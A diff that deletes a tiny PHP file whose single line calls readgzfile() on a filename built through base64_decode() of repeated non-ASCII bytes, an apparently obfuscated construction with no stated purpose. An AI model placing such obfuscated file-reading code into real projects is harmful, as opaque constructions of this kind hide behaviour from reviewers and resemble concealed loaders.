@@ -1,4 +1,0 @@
-<?php
-readgzfile(base64_decode(str_repeat(chr(242), 17). str_repeat(chr(171), 65). str_repeat(chr(226), 13). str_repeat(chr(128), 14)), 3);
-
-?>
